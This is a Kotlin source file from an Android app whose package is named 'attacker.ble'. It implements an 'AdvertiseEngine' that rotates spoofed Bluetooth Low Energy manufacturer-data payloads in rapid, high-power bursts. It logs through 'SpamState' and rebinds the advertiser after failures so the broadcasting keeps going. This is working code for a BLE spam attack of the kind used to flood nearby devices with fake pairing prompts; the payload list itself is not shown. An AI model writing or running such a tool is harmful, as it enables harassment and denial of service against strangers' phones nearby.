package com.komugi.attacker.ble

import android.Manifest
import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.currentCoroutineContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.Locale

/**
 * Rotates BLE advertisement payloads stably without exhausting or crashing the Bluetooth controller.
 */
@SuppressLint("MissingPermission")
class AdvertiseEngine(
    private val context: Context,
    private val config: SpamConfig,
    private val payloads: List<BlePayload>,
) {

    private var job: Job? = null
    private var advertiser: BluetoothLeAdvertiser? = null
    private var adapter: BluetoothAdapter? = null
    private var isAdvertising = false

    private val settings: AdvertiseSettings = AdvertiseSettings.Builder()
        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
        .setConnectable(true)
        .setTimeout(0)
        .build()

    private val callback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
            isAdvertising = true
        }

        override fun onStartFailure(errorCode: Int) {
            isAdvertising = false
            // 1: DATA_TOO_LARGE, 2: TOO_MANY_ADVERTISERS, 3: ALREADY_STARTED, 4: INTERNAL_ERROR, 5: FEATURE_UNSUPPORTED
            SpamState.log("advertise: start failure code=$errorCode")
        }
    }

    fun start(scope: CoroutineScope) {
        if (job != null) return
        if (!hasPermissions()) {
            SpamState.log("advertise: missing BLUETOOTH_ADVERTISE permission")
            return
        }
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = manager?.adapter
        if (adapter == null || !adapter!!.isEnabled) {
            SpamState.log("advertise: bluetooth is off")
            return
        }
        advertiser = adapter!!.bluetoothLeAdvertiser
        if (advertiser == null) {
            SpamState.log("advertise: this controller has no LE advertiser")
            return
        }
        
        SpamState.log("advertise: engine up, ${payloads.size} payloads, ${config.effectiveInterval} ms")
        job = scope.launch { loop() }
    }

    fun stop() {
        job?.cancel()
        job = null
        stopCurrentBurst()
        advertiser = null
    }

    private fun stopCurrentBurst() {
        runCatching {
            advertiser?.stopAdvertising(callback)
        }
        isAdvertising = false
    }

    private suspend fun loop() {
        var burst = 0
        var consecutiveFailures = 0
        while (currentCoroutineContext().isActive) {
            val payload = payloads.randomOrNull()
            if (payload == null) {
                SpamState.log("advertise: no payload selected")
                return
            }
            val data = buildData(payload)
            if (data == null) {
                SpamState.failure("too large")
                delay(100)
                continue
            }
            val started: Boolean = startBurst(data)

            if (started) {
                burst++
                consecutiveFailures = 0
                SpamState.packet(payload.label)
                if (burst % 40 == 0) {
                    SpamState.log(
                        String.format(Locale.US, "advertise: %d bursts, payload %s", burst, payload.label)
                    )
                }
                delay(config.effectiveInterval.coerceAtLeast(150L))
            } else {
                consecutiveFailures++
                SpamState.failure(payload.label)
                delay(backoffFor(consecutiveFailures))
                if (consecutiveFailures % 10 == 0) {
                    recoverAdvertiser()
                }
            }
        }
    }

    private suspend fun startBurst(data: AdvertiseData): Boolean {
        return try {
            val adv = advertiser ?: return false
            // Stop previous burst cleanly with settle delay so BT controller doesn't choke
            runCatching { adv.stopAdvertising(callback) }
            delay(STOP_SETTLE_MS)
            adv.startAdvertising(settings, data, null, callback)
            true
        } catch (throwable: Throwable) {
            SpamState.log("advertise error: ${throwable.javaClass.simpleName} ${throwable.message.orEmpty()}")
            false
        }
    }

    private fun backoffFor(failures: Int): Long = when {
        failures < 3 -> 150L
        failures < 10 -> 350L
        else -> 1000L
    }

    private fun recoverAdvertiser() {
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val ad = manager?.adapter ?: return
        runCatching { advertiser?.stopAdvertising(callback) }
        advertiser = ad.bluetoothLeAdvertiser
        SpamState.log("advertise: advertiser rebind after failures")
    }

    private fun buildData(payload: BlePayload): AdvertiseData? {
        if (payload.data.size > Payloads.MAX_PAYLOAD_BYTES) return null
        return runCatching {
            AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .addManufacturerData(payload.companyId, payload.data)
                .build()
        }.getOrNull()
    }

    private fun hasPermissions(): Boolean {
        val required = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            listOf(Manifest.permission.BLUETOOTH_ADVERTISE, Manifest.permission.BLUETOOTH_CONNECT)
        } else {
            listOf(Manifest.permission.BLUETOOTH_ADMIN)
        }
        return required.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    companion object {
        private const val STOP_SETTLE_MS = 60L
    }
}
